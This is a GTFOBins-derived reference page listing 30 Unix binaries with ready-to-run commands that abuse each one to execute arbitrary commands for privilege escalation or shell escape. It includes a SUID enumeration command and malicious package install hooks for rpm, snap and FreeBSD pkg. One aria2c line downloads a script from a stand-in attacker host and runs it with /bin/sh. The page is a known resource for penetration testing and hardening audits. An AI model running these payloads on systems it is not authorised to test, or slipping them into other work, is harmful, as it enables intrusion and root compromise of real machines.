---
title: "GTFOBins - command (30 binaries)"
category: "misc"
subcategory: "privilege-escalation"
type: "reference"
tags: ["gtfobins", "privilege-escalation", "privesc", "shell-escape", "restricted-shell", "linux", "post-exploitation", "binary-abuse", "lolbins", "living-off-the-land", "command"]
summary: "30 Unix binaries whose command function runs a single command."
source:
  name: "GTFOBins/GTFOBins.github.io"
  url: "https://github.com/GTFOBins/GTFOBins.github.io"
license: "GPL-3.0"
---

## What this page is

Every GTFOBins binary whose `command` function runs a single command, with the exact command. 30 binaries.

## Finding your way in

```bash
# intersect what is available with what is on this page
find / -perm -4000 -type f 2>/dev/null
```

## command payloads

### acr

*Contexts: sudo, suid, unprivileged*

```bash
echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file
```

### aria2c

Note that the subprocess is immediately sent to the background.

*Contexts: sudo, suid, unprivileged*

```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain
```

The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.

*Contexts: sudo, suid, unprivileged*

```bash
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
```

### at

*Contexts: sudo, unprivileged*

```bash
echo /path/to/command | at now
```

### crash

*Contexts: sudo, unprivileged*

```bash
CRASHPAGER=/path/to/command crash -h
```

### crontab

This spaws the default editor to edit the crontab file, commands can be scheduled to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron).

*Contexts: sudo, unprivileged*

```bash
crontab -e
```

### dnf

Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install x.sh .
```

The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.

*Contexts: sudo*

```bash
dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
```

### dnsmasq

*Contexts: sudo, suid, unprivileged*

```bash
dnsmasq --conf-script='/path/to/command 1>&2'
```

### fail2ban-client

The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns.

*Contexts: sudo*

```bash
fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban /path/to/command
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x
```

*Contexts: sudo*

```bash
cat >/path/to/temp-dir/fail2ban.conf <<EOF
[Definition]
EOF

cat >/path/to/temp-dir/jail.local <<EOF
[x]
enabled = true
action = x
EOF

mkdir -p /path/to/temp-dir/action.d/
cat >/path/to/temp-dir/action.d/x.conf <<EOF
[Definition]
actionstart = /path/to/command
EOF

mkdir -p /path/to/temp-dir/filter.d/
cat >/path/to/temp-dir/filter.d/x.conf <<EOF
[Definition]
EOF

fail2ban-client -c /path/to/temp-dir/ -v restart
```

### fastfetch

*Contexts: sudo, suid, unprivileged*

```bash
echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc
```

### fzf

Commands can be issued via POST requests, for example:

```
curl http://localhost:12345 -d 'execute(/path/to/command)'
```

*Contexts: sudo, suid, unprivileged*

```bash
fzf --listen=12345
```

### less

*Contexts: unprivileged*

```bash
cp /path/to/command ~/.lessfilter
less /etc/hosts
```

*Contexts: sudo, unprivileged*

```bash
LESSOPEN='/path/to/command # %s' less /etc/hosts
```

### m4

*Contexts: sudo, suid, unprivileged*

```bash
echo 'esyscmd(/path/to/command)' | m4
```

### nohup

The `nohup.out` file contains the standard output and error of the command.

*Contexts: sudo, suid, unprivileged*

```bash
nohup /path/to/command
cat nohup.out
```

### opencode

*Contexts: sudo, suid, unprivileged*

```bash
opencode
! /path/to/command
```

### openvt

The command execution is displayed on the virtual console.

*Contexts: sudo*

```bash
openvt -- /path/to/command
```

### php

*Contexts: sudo, suid, unprivileged*

```bash
php -r 'echo shell_exec("/path/to/command");'
```

*Contexts: sudo, suid, unprivileged*

```bash
php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
```

*Contexts: sudo, suid, unprivileged*

```bash
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
```

### pkg

Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo /path/to/command >x.sh
fpm -n x -s dir -t freebsd -a all --before-install x.sh .
```

*Contexts: sudo*

```bash
pkg install -y --no-repo-update ./x-1.0.txz
```

### procmail

The program is picky about the file ownership, and waits for some input.

*Contexts: sudo, unprivileged*

```bash
echo -e ':0\n| /path/to/command >/path/to/temp-file
procmail -m /path/to/temp-file
```

### restic

*Contexts: sudo, suid, unprivileged*

```bash
RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
```

*Contexts: sudo, suid, unprivileged*

```bash
restic --password-command='/path/to/command' backup
```

### rpm

Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install x.sh .
```

*Contexts: sudo*

```bash
rpm -ivh x-1.0-1.noarch.rpm
```

### rsyslogd

In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example:

```
ssh somerandomstring@victim.com
```

*Contexts: sudo*

```bash
cat >/path/to/temp-file <<EOF
module(load="imuxsock")
:msg, contains, "somerandomstring" ^/path/to/command
EOF

rsyslogd -f /path/to/temp-file
```

### rustup

*Contexts: sudo, unprivileged*

```bash
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
echo '/path/to/command' >/path/to/temp-dir/bin/rustc
chmod +x /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc
```

### snap

Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
mkdir -p meta/hooks
echo -e '#!/bin/sh\n/path/to/command; false' >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

*Contexts: sudo*

```bash
snap install xxxx_1.0_all.snap --dangerous --devmode
```

### sshfs

*Contexts: sudo, unprivileged*

```bash
sshfs -o ssh_command=/path/to/command x: /path/to/dir/
```

### sysctl

The command is executed by `root` in the background when a core dump occurs.

To trigger a core dump, send the `SIGQUIT` signal to a process, for example:

```
sleep infinity &
kill -QUIT $!
```

*Contexts: sudo, suid*

```bash
sysctl 'kernel.core_pattern=|/path/to/command'
```

### systemd-run

*Contexts: sudo*

```bash
systemd-run /path/to/command
```

### tcpdump

command — sudo variant

*Contexts: sudo*

```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root
```

This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.

*Contexts: sudo (variant below), unprivileged*

```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file
```

This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply.

*Contexts: sudo, unprivileged*

```bash
tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command
```

### virsh

*Contexts: sudo*

```bash
cat >/path/to/temp-file.xml <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='/path/to/command'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x
```

### yum

Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install .x.sh .
```

*Contexts: sudo*

```bash
yum localinstall -y x-1.0-1.noarch.rpm
```

### zic

This executes the command twice:

- `/path/to/command 0 xxx`
- `/path/to/command 1 xxx`

Additionally the `Test` file is created.

*Contexts: sudo, suid, unprivileged*

```bash
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file
```

## Attribution

Data from [GTFOBins](https://gtfobins.github.io/) (commit `acd524623f9c`), licensed GPL-3.0. Vendored at `vendor/GTFOBins/_gtfobins/`.
